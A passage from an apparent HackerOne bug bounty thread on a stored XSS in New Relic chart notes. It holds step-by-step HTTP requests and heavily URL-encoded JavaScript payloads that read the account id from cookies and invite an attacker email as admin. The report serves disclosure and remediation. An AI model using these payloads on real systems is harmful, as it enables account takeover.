0%74%69%6f%6e%73%26%71%75%6f%74%3b%3a%7b%7d%2c%26%71%75%6f%74%3b%78%41%78%69%73%26%71%75%6f%74%3b%3a%7b%7d%7d%3c%2f%73%70%61%6e%3e\u0026title=\u0026tw%5Bdur%5D=last_30_minutes\u0026tw%5Bend%5D=1551876408\u0026value=call_count\u0026no_click=1\u0026no_links=1`\n\nThen you need urlencode it and set to the `note_item[data_url]` parameter of initial request. Then when you visit created note, the malicious admin will be invited automatically, with no any user interaction required.\n\n###Extra mitigation\nI have discovered one more issue related to insecure chart data JSON generation process.\nIf vulnerable fields `title`, `subtitle` and `number_suffix` contains some tags like `\u003cimg src='x'\u003e`, then at chart data JSON generation step, this tags becomes `\u003cimg src=\"x\"\u003e` with quotes inside, that can be used to break resulting JSON fields and inject malicious fields that way.\n\n###PoC with no user interaction\n{F438791}","automated_response":false,"created_at":"2019-03-10T15:55:32.776Z","updated_at":"2019-03-10T15:59:29.908Z","actor":{"username":"skavans","cleared":true,"url":"/skavans","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4307775,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey team,\n\nAfter further investigations I have discovered that the vulnerability root cause is slightly more complicated.\nI was wrong a little describing how the process works. Now I understand the steps preformed when the chart is saved to note better:\n1. The `note_item[data_url]` URL parameter is saved to DB **as is**, not its parameters only;\n2. When the note is opened, and chart data is loaded from URL like `accounts/2260599/notes/6077/items/12992/chart_data`, server **makes real GET-query with user's cookies** to the saved URL (this is the step where I found an **extra bug** – attacker can submit any *internal* URL here and its content will be followed to the chart);\n3. Then the server processes retrieved data (this is the step where all issues described above like replacing `\u0026quot;` to `\"` and HTML tags processing are done) and returns the processed data to client.\n\n###So, there 2 vulnerabilities in fact:\n1. The one described at my first submission. Improper processing the `note_item[data_url]` response: `\u0026quot;` unescaping and HTML tags processing, that helps attacker to break resulting JSON and inject malicious payload inside.\n2. Improper `note_item[data_url]` check itself: attacker can submit any internal URL there and its content will be returned to the Highcharts chart. So if you fix the first vulnerability, attacker can submit any other internal URL returning JSON with malicious payload when saving a chart to note and it could be resulted in XSS too.\n\nI was not successful with submitting any *external* URL but there are many JSON endpoints at New Relic app and I am pretty sure that some of them could also be used to exploit this vulnerability. In any case, you should check the `note_item[data_url]` URL better (that it is a chart data JSON URL, not something else), because every internal URL (even returning HTML) is allowed now.\n\n###Extra mitigation #2\n\nIn my opinion the design of vulnerable component is bad at all. Storing the URL as is and requesting it when build a chart data JSON is justified only if different complicated endpoints can provide the chart data. For now, I see only `/chart_data/metric_charts/single_metric.json` endpoint providing initial chart data, so you can parse a submitted URL and get necessary parameters from it, and then get data from DB searching for the corresponding entries. If I am wrong and there are many different endpoints, you should build a URL white list, containing only trusted endpoints, that may not contain malicious JSON.\n\nIf I am not clear somewhere, please feel free to reach me and I will be glad to help in discovering and mitigating the issues.\n\n**P.S.**: I have decided not to submit the second bug apart, but if you agree that there 2 different root causes exist, the extra bounty bonus will be much appreciated :)","automated_response":false,"created_at":"2019-03-12T13:34:09.936Z","updated_at":"2019-03-12T13:34:09.936Z","actor":{"username":"skavans","cleared":true,"url":"/skavans","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4309438,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @skavans ,\n\nThanks for your report! If this is valid, it's a pretty intense bug that will take me a little while to reproduce/triage. I appreciate your patience while I try to figure this one out :)","automated_response":false,"created_at":"2019-03-12T17:37:23.205Z","updated_at":"2019-03-12T17:37:23.205Z","actor":{"username":"dday","cleared":false,"url":"/dday","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/290/656/1ef18673ce65d82a0c72315185fac6be67c06f0a_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4309482,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @dday,\n\nOf course I will wait. If you have any difficulties with reproducing the bug, I can share infected note with you and give you direct link.","automated_response":false,"created_at":"2019-03-12T17:43:27.339Z","updated_at":"2019-03-12T17:43:27.339Z","actor":{"username":"skavans","cleared":true,"url":"/skavans","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4309566,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"OK @skavans ,\n\nPayload aside, can you help me understand the attack scenario better? Here's how I understand it.\n\n1)An attacker has a New Relic account\n2)The **attacker** creates an infected note\n3)The **attacker** sends the **victim** a link to the note\n4)The **victim** clicks the link\n5)An admin gets added to the **attackers** account\n\nDo I understand that correctly? Or can this attack be used to add yourself as an admin to the victims account?","automated_response":false,"created_at":"2019-03-12T17:59:18.947Z","updated_at":"2019-03-12T17:59:18.947Z","actor":{"username":"dday","cleared":false,"url":"/dday","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/290/656/1ef18673ce65d82a0c72315185fac6be67c06f0a_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4309568,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"","automated_response":false,"created_at":"2019-03-12T17:59:26.917Z","updated_at":"2019-03-12T17:59:26.917Z","actor":{"username":"dday","cleared":false,"url":"/dday","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/290/656/1ef18673ce65d82a0c72315185fac6be67c06f0a_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4309617,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"I have reported a new payload below requiring no user interaction (no needing clicking the link).\n\nThe attack scenario:\n1) An **attacker** has an account\n2) **Attacker** creates an infected note\n3) **Attacker** publishes the note (it is available for all users at all accounts now)\n4) **Victim** (from attacker's account or from any other one) opens the note and adds **attacker** (some user by email) to **victim's** account.\n\nThere are 2 possible scenarios:\n- if attacker is `User`, he can infect a note and when his admin opens the note, he invites some user as account admin (in fact there is any code could be executed, this one is just an example);\n- attacker can publish a note and send link to it to some admin, which is not belongs to attacker's account, and the attacker will become a victim's account admin.\n\nI do not know, if users can see all published notes in some view. If they are, the attacker should not even send a link to anybody.","automated_response":false,"created_at":"2019-03-12T18:10:58.083Z","updated_at":"2019-03-12T18:10:58.083Z","actor":{"username":"skavans","cleared":true,"url":"/skavans","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4309709,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks @skavans . This is a VERY good bug. Let me work on trying to reproduce it and figure out where the issue lies. I'll reach out if I need more assistance.","automated_response":false,"created_at":"2019-03-12T18:27:10.574Z","updated_at":"2019-03-12T18:27:10.574Z","actor":{"username":"dday","cleared":false,"url":"/dday","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/290/656/1ef18673ce65d82a0c72315185fac6be67c06f0a_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4309751,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Of course @dday. Please read the whole thread first, I investigated this for some time, so there are a lot of potentially helpful information.","automated_response":false,"created_at":"2019-03-12T18:33:10.102Z","updated_at":"2019-03-12T18:33:10.102Z","actor":{"username":"skavans","cleared":true,"url":"/skavans","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4309827,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"To explain this fully:\n\nThis is a classical stored XSS, and every user visiting some (infected) note, executes some malicious JS-code at his browser. This code can do every thing the attacker want, including inviting other user as account admin (when the victim is admin or owner). \n\nWhy this is more impactful than, for example #348076? It's because at the #348076, the payload is stored inside the account area, so it may only be placed by account member (with at least role `User`). So at that case, the attacker can attack his own admin only. And in **this** case, the user can attack **other** account admin, because the payload is stored inside public area, available for any user of New Relic.\n\nHope this will help you to understand the issue impact ;)","automated_response":false,"created_at":"2019-03-12T18:51:05.077Z","updated_at":"2019-03-12T18:51:05.077Z","actor":{"username":"skavans","cleared":true,"url":"/skavans","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4318061,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"It seems that embedding a chart is secure in spite of embedding works in a similar way.\nAt first sight, It is impossible to submit arbitrary URL there (there is some regex check implemented) and there is no result processing like replacing `\u0026quot;` to `\"`.\nMay be it will be nice if you design the saving chart to a note in a similar way.","automated_response":false,"created_at":"2019-03-13T17:19:56.096Z","updated_at":"2019-03-13T17:22:02.255Z","actor":{"username":"skavans","cleared":true,"url":"/skavans","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4319516,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @skavans ,\n\nI'm working on trying to reproduce this and I'm having a bit of difficulty.\n\nCan you provide the following\n\n1)The request body that you are capturing\n2)The edited request body\n3)A video PoC?\n\nThanks so much for your patience!","automated_response":false,"created_at":"2019-03-13T22:23:01.677Z","updated_at":"2019-03-13T22:23:01.677Z","actor":{"username":"dday","cleared":false,"url":"/dday","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/290/656/1ef18673ce65d82a0c72315185fac6be67c06f0a_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4319674,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @dday,\n\nI am sorry, the exploitation is really complicated because of a lot of encoding layers. I'll try to explain this step by step.\n\nI have just realized that the chart should not be empty, so:\n\n1) Save any non-empty chart to note. The original request is the following:\n\n```http\nPOST /accounts/2260599/notes?agent_id=undefined HTTP/1.1\nHost: rpm.newrelic.com\n\u003credacted\u003e\n\nutf8=%E2%9C%93\u0026authenticity_token=ny%2BgLH4ynkp9bFbwouysKyYMWH0da9e5G4cJ2tna5YM%3D\u0026app_name=undefined\u0026note_item%5Bswf%5D=\u0026note_item%5Bbegin_time%5D=2019-03-13T08%3A03%3A08-07%3A00\u0026note_item%5Bend_time%5D=2019-03-13T08%3A33%3A08-07%3A00\u0026note_item%5Btitle%5D=TITLE\u0026note_item%5Bdata_url%5D=%2Fchart_data%2Fmetric_charts%2Fsingle_metric.json%3Faccount_id%3D2260599%26add_to_dashboard%3Dfalse%26agent%3D287785625%26chart_type%3DMSLine%26current_product%3Dapm_product%26format_fn%3Dsmart_round%26hide_legend%3Dfalse%26limit%3D100%26name%3DFunction%252F__main__%253AMainHandler.get%26no_click%3Dtrue%26no_links%3Dtrue%26number_suffix%3DUNITS%2526%2523x27%253Bxss%26render_to%3D45054%26show_events%3Dtrue%26subtitle%3DSUBTITLE%26title%3DTITLE%26tw%255Bdur%255D%3Dlast_30_minutes%26tw%255Bend%255D%3D1552491188%26value%3Dstandard_deviation%26no_click%3D1%26no_links%3D1\u0026note_item%5Bcontext_url%5D=%2Faccounts%2F2260599%2Fcustom_dashboards%2Fpages%2F14736%3Ftw%255Bdur%255D%3Dlast_30_minutes%26tw%255Bend%255D%3D1552491188\u0026note_item%5Bnote_text%5D=\u0026note_action=create\u0026note_id=6136\u0026action_after=save_and_close\n```\n\n2) Ejects the `note_item%5Bdata_url%5D` parameter value and urldecode it getting the following:\n```\n/chart_data/metric_charts/single_metric.json?account_id=2260599\u0026add_to_dashboard=false\u0026agent=287785625\u0026chart_type=StackedArea2D\u0026current_product=apm_product\u0026format_fn=smart_round\u0026hide_legend=false\u0026limit=100\u0026name=Agent%2FMetricsReported%2Fcount\u0026no_click=true\u0026no_links=true\u0026number_suffix=\u0026render_to=45099\u0026show_events=true\u0026subtitle=subtitle\u0026title=test\u0026tw%5Bdur%5D=last_30_minutes\u0026tw%5Bend%5D=1552517054\u0026value=call_count\u0026no_click=1\u0026no_links=1\u0026note_item[context_url]=/accounts/2260599/custom_dashboards/pages/14771?tw%5Bdur%5D=last_30_minutes\n```\n\n3) Edit it the following way:\n\n```\n/chart_data/metric_charts/single_metric.json?account_id=2260599\u0026add_to_dashboard=false\u0026agent=287785625\u0026chart_type=StackedArea2D\u0026current_product=apm_product\u0026format_fn=smart_round\u0026hide_legend=false\u0026limit=100\u0026name=Agent%2FMetricsReported%2Fcount\u0026no_click=true\u0026no_links=true\u0026number_suffix=%27%76%61%72%20%61%63%63%6f%75%6e%74%5f%69%64%3d%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%2e%6d%61%74%63%68%28%2f%61%6a%73%5f%67%72%6f%75%70%5f%69%64%3d%28%5c%64%2b%29%2f%29%5b%31%5d%3b%76%61%72%20%70%61%72%61%6d%73%3d%7b%61%63%63%6f%75%6e%74%5f%76%69%65%77%3a%7b%75%73%65%72%3a%7b%66%75%6c%6c%5f%6e%61%6d%65%3a%22%41%54%54%41%43%4b%45%52%22%2c%65%6d%61%69%6c%3a%22%61%74%74%61%63%6b%65%72%40%73%6b%61%76%61%6e%73%2e%72%75%22%7d%2c%6c%65%76%65%6c%3a%22%61%64%6d%69%6e%22%7d%7d%3b%24%2e%61%6a%61%78%28%7b%75%72%6c%3a%60%68%74%74%70%73%3a%2f%2f%72%70%6d%2e%6e%65%77%72%65%6c%69%63%2e%63%6f%6d%2f%75%73%65%72%5f%6d%61%6e%61%67%65%6d%65%6e%74%2f%61%63%63%6f%75%6e%74%73%2f%24%7b%61%63%63%6f%75%6e%74%5f%69%64%7d%2f%75%73%65%72%73%2f%6e%65%77%60%2c%64%61%74%61%3a%4a%53%4f%4e%2e%73%74%72%69%6e%67%69%66%79%28%70%61%72%61%6d%73%29%2c%68%65%61%64%65%72%73%3a%7b%22%63%6f%6e%74%65%6e%74%2d%74%79%70%65%22%3a%20%22%61%70%70%6c%69%63%61%74%69%6f%6e%2f%6a%73%6f%6e%22%7d%2c%74%79%70%65%3a%22%70%6f%73%74%22%2c%61%73%79%6e%63%3a%66%61%6c%73%65%7d%29%3b%61%6c%65%72%74%28%22%41%54%54%41%43%4b%45%52%20%61%64%6d%69%6e%20%77%61%73%20%69%6e%76%69%74%65%64%22%29%3b%27+\u003cimg/\u003e\u0026render_to=45099\u0026show_events=true\u0026subtitle=%26%71%75%6f%74%3b%7d%2c%26%71%75%6f%74%3b%73%65%72%69%65%73%26%71%75%6f%74%3b%3a%5b%7b%26%71%75%6f%74%3b%64%61%74%61%26%71%75%6f%74%3b%3a%5b%7b%26%71%75%6f%74%3b%6e%61%6d%65%26%71%75%6f%74%3b%3a%26%71%75%6f%74%3b%26%71%75%6f%74%3b%2c%26%71%75%6f%74%3b%79%26%71%75%6f%74%3b%3a%32%7d%5d%7d%5d%2c%26%71%75%6f%74%3b%79%41%78%69%73%26%71%75%6f%74%3b%3a%5b%7b%26%71%75%6f%74%3b%74%79%70%65%26%71%75%6f%74%3b%3a%26%71%75%6f%74%3b%63%61%74%65%67%6f%72%79%26%71%75%6f%74%3b%2c%26%71%75%6f%74%3b%63%61%74%65%67%6f%72%69%65%73%26%71%75%6f%74%3b%3a%5b%26%71%75%6f%74%3b%3c%73%76%67%20%6f%6e%6c%6f%61%64%3d%27%2c%27%3e%3c%2f%73%76%67%3e%26%71%75%6f%74%3b%5d%2c%26%71%75%6f%74%3b%6c%61%62%65%6c%73%26%71%75%6f%74%3b%3a%7b%26%71%75%6f%74%3b%65%6e%61%62%6c%65%64%26%71%75%6f%74%3b%3a%74%72%75%65%2c%26%71%75%6f%74%3b%75%73%65%48%54%4d%4c%26%71%75%6f%74%3b%3a%74%72%75%65%7d%7d%5d%2c%26%71%75%6f%74%3b%70%6c%6f%74%4f%70%74%69%6f%6e%73%26%71%75%6f%74%3b%3a%7b%7d%2c%26%71%75%6f%74%3b%78%41%78%69%73%26%71%75%6f%74%3b%3a%7b%7d%7d%3c%2f%73%70%61%6e%3e\u0026title=test\u0026tw%5Bdur%5D=last_30_minutes\u0026tw%5Bend%5D=1552517054\u0026value=call_count\u0026no_click=1\u0026no_links=1\u0026note_item[context_url]=/accounts/2260599/custom_dashboards/pages/14771?tw%5Bdur%5D=last_30_minutes\n```\n\nThe `number_suffix` and `subtitle` fields are changed (I cannot bold them for unknown reason, please find them using search in page).\n\n4) Urlencode the result back, getting the following:\n```\n%2f%63%68%61%72%74%5f%64%61%74%61%2f%6d%65%74%72%69%63%5f%63%68%61%72%74%73%2f%73%69%6e%67%6c%65%5f%6d%65%74%72%69%63%2e%6a%73%6f%6e%3f%61%63%63%6f%75%6e%74%5f%69%64%3d%32%32%36%30%35%39%39%26%61%64%64%5f%74%6f%5f%64%61%73%68%62%6f%61%72%64%3d%66%61%6c%73%65%26%61%67%65%6e%74%3d%32%38%37%37%38%35%36%32%35%26%63%68%61%72%74%5f%74%79%70%65%3d%53%74%61%63%6b%65%64%41%72%65%61%32%44%26%63%75%72%72%65%6e%74%5f%70%72%6f%64%75%63%74%3d%61%70%6d%5f%70%72%6f%64%75%63%74%26%66%6f%72%6d%61%74%5f%66%6e%3d%73%6d%61%72%74%5f%72%6f%75%6e%64%26%68%69%64%65%5f%6c%65%67%65%6e%64%3d%66%61%6c%73%65%26%6c%69%6d%69%74%3d%31%30%30%26%6e%61%6d%65%3d%41%67%65%6e%74%25%32%46%4d%65%74%72%69%63%73%52%65%70%6f%72%74%65%64%25%32%46%63%6f%75%6e%74%26%6e%6f%5f%63%6c%69%63%6b%3d%74%72%75%65%26%6e%6f%5f%6c%69%6e%6b%73%3d%74%72%75%65%26%6e%75%6d%62%65%72%5f%73%75%66%66%69%78%3d%25%32%37%25%37%36%25%36%31%25%37%32%25%32%30%25%36%31%25%36%33%25%36%33%25%36%66%25%37%35%25%36%65%25%37%34%25%35%66%25%36%39%25%36%34%25%33%64%25%36%34%25%36%66%25%36%33%25%37%35%25%36%64%25%36%35%25%36%65%25%37%34%25%32%65%25%36%33%25%36%66%25%36%66%25%36%62%25%36%39%25%36%35%25%32%65%25%36%64%25%36%31%25%37%34%25%36%33%25%36%38%25%32%38%25%32%66%25%36%31%25%36%61%25%37%33%25%35%66%25%36%37%25%37%32%25%36%66%25%37%35%25%37%30%25%35%66%25%36%39%25%36%34%25%33%64%25%32%38%25%35%63%25%36%34%25%32%62%25%32%39%25%32%66%25%32%39%25%35%62%25%33%31%25%35%64%25%33%62%25%37%36%25%36%31%25%37%32%25%32%30%25%37%30%25%36%31%25%37%32%25%36%31%25%36%64%25%37%33%25%33%64%25%37%62%25%36%31%25%36%33%25%36%33%25%36%66%25%37%35%25%36%65%25%37%34%25%35%66%25%37%36%25%36%39%25%36%35%25%37%37%25%33%61%25%37%62%25%37%35%25%37%33%25%36%35%25%37%32%25%33%61%25%37%62%25%36%36%25%37%35%25%36%63%25%36%63%25%35%66%25%36%65%25%36%31%25%36%64%25%36%35%25%33%61%25%32%32%25%34%31%25%35%34%25%35%34%25%34%31%25%34%33%25%34%62%25%34%35%25%35%32%25%32%32%25%32%63%25%36%35%25%36%64%25%36%31%25%36%39%25%36%63%25%33%61%25%32%32%25%36%31%25%37%34%25%37%34%25%36%31%25%36%33%25%36%62%25%36%35%25%37%32%25%34%30%25%37%33%25%36%62%25%36%31%25%37%36%25%36%31%25%36%65%25%37%33%25%32%65%25%37%32%25%37%35%25%32%32%25%37%64%25%32%63%25%36%63%25%36%35%25%37%36%25%36%35%25%36%63%25%33%61%25%32%32%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65%25%32%32%25%37%64%25%37%64%25%33%62%25%32%34%25%32%65%25%36%31%25%36%61%25%36%31%25%37%38%25%32%38%25%37%62%25%37%35%25%37%32%25%36%63%25%33%61%25%36%30%25%36%38%25%37%34%25%37%34%25%37%30%25%37%33%25%33%61%25%32%66%25%32%66%25%37%32%25%37%30%25%36%64%25%32%65%25%36%65%25%36%35%25%37%37%25%37%32%25%36%35%25%36%63%25%36%39%25%36%33%25%32%65%25%36%33%25%36%66%25%36%64%25%32%66%25%37%35%25%37%33%25%36%35%25%37%32%25%35%66%25%36%64%25%36%31%25%36%65%25%36%31%25%36%37%25%36%35%25%36%64%25%36%35%25%36%65%25%37%34%25%32%66%25%36%31%25%36%33%25%36%33%25%36%66%25%37%35%25%36%65%25%37%34%25%37%33%25%32%66%25%32%34%25%37%62%25%36%31%25%36%33%25%36%33%25%36%66%25%37%35%25%36%65%25%37%34%25%35%66%25%36%39%25%36%34%25%37%64%25%32%66%25%37%35%25%37%33%25%36%35%25%37%32%25%37%33%25%32%66%25%36%65%25%36%35%25%37%37%25%36%30%25%32%63%25%36%34%25%36%31%25%37%34%25%36%31%25%33%61%25%34%61%25%35%33%25%34%66%25%34%65%25%32%65%25%37%33%25%37%34%25%37%32%25%36%39%25%36%65%25%36%37%25%36%39%25%36%36%25%37%39%25%32%38%25%37%30%25%36%31%25%37%32%25%36%31%25%36%64%25%37%33%25%32%39%25%32%63%25%36%38%25%36%35%25%36%31%25%36%34%25%36%35%25%37%32%25%37%33%25%33%61%25%37%62%25%32%32%25%36%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%37%34%25%37%39%25%37%30%25%36%35%25%32%32%25%33%61%25%32%30%25%32%32%25%36%31%25%37%30%25%37%30%25%36%63%25%36%39%25%36%33%25%36%31%25%37%34%25%36%39%25%36%66%25%36%65%25%32%66%25%36%61%25%37%33%25%36%66%25%36%65%25%32%32%25%37%64%25%32%63%25%37%34%25%37%39%25%37%30%25%36%35%25%33%61%25%32%32%25%37%30%25%36%66%25%37%33%25%37%34%25%32%32%25%32%63%25%36%31%25%37%33%25%37%39%25%36%65%25%36%33%25%33%61%25%36%36%25%36%31%25%36%63%25%37%33%25%36%35%25%37%64%25%32%39%25%33%62%25%36%31%25%36%63%25%36%35%25%37%32%25%37%34%25%32%38%25%32%32%25%34%31%25%35%34%25%35%34%25%34%31%25%34%33%25%34%62%25%34%35%25%35%32%25%32%30%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65%25%32%30%25%37%37%25%36%31%25%37%33%25%32%30%25%36%39%25%36%65%25%37%36%25%36%39%25%37%34%25%36%35%25%36%34%25%32%32%25%32%39%25%33%62%25%32%37%2b%3c%69%6d%67%2f%3e%26%72%65%6e%64%65%72%5f%74%6f%3d%34%35%30%39%39%26%73%68%6f%77%5f%65%76%65%6e%74%73%3d%74%72%75%65%26%73%75%62%74%69%74%6c%65%3d%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%37%64%25%32%63%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%37%33%25%36%35%25%37%32%25%36%39%25%36%35%25%37%33%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%61%25%35%62%25%37%62%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%36%34%25%36%31%25%37%34%25%36%31%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%61%25%35%62%25%37%62%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%36%65%25%36%31%25%36%64%25%36%35%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%61%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%32%63%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%37%39%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%61%25%33%32%25%37%64%25%35%64%25%37%64%25%35%64%25%32%63%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%37%39%25%34%31%25%37%38%25%36%39%25%37%33%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%61%25%35%62%25%37%62%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%37%34%25%37%39%25%37%30%25%36%35%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%61%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%36%33%25%36%31%25%37%34%25%36%35%25%36%37%25%36%66%25%37%32%25%37%39%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%32%63%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%36%33%25%36%31%25%37%34%25%36%35%25%36%37%25%36%66%25%37%32%25%36%39%25%36%35%25%37%33%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%61%25%35%62%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%63%25%37%33%25%37%36%25%36%37%25%32%30%25%36%66%25%36%65%25%36%63%25%36%66%25%36%31%25%36%34%25%33%64%25%32%37%25%32%63%25%32%37%25%33%65%25%33%63%25%32%66%25%37%33%25%37%36%25%36%37%25%33%65%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%35%64%25%32%63%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%36%63%25%36%31%25%36%32%25%36%35%25%36%63%25%37%33%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%61%25%37%62%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%36%35%25%36%65%25%36%31%25%36%32%25%36%63%25%36%35%25%36%34%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%61%25%37%34%25%37%32%25%37%35%25%36%35%25%32%63%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%37%35%25%37%33%25%36%35%25%34%38%25%35%34%25%34%64%25%34%63%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%61%25%37%34%25%37%32%25%37%35%25%36%35%25%37%64%25%37%64%25%35%64%25%32%63%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%37%30%25%36%63%25%36%66%25%37%34%25%34%66%25%37%30%25%37%34%25%36%39%25%36%66%25%36%65%25%37%33%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%61%25%37%62%25%37%64%25%32%63%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%37%38%25%34%31%25%37%38%25%36%39%25%37%33%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%61%25%37%62%25%37%64%25%37%64%25%33%63%25%32%66%25%37%33%25%37%30%25%36%31%25%36%65%25%33%65%26%74%69%74%6c%65%3d%74%65%73%74%26%74%77%25%35%42%64%75%72%25%35%44%3d%6c%61%73%74%5f%33%30%5f%6d%69%6e%75%74%65%73%26%74%77%25%35%42%65%6e%64%25%35%44%3d%31%35%35%32%35%31%37%30%35%34%26%76%61%6c%75%65%3d%63%61%6c%6c%5f%63%6f%75%6e%74%26%6e%6f%5f%63%6c%69%63%6b%3d%31%26%6e%6f%5f%6c%69%6e%6b%73%3d%31%26%6e%6f%74%65%5f%69%74%65%6d%5b%63%6f%6e%74%65%78%74%5f%75%72%6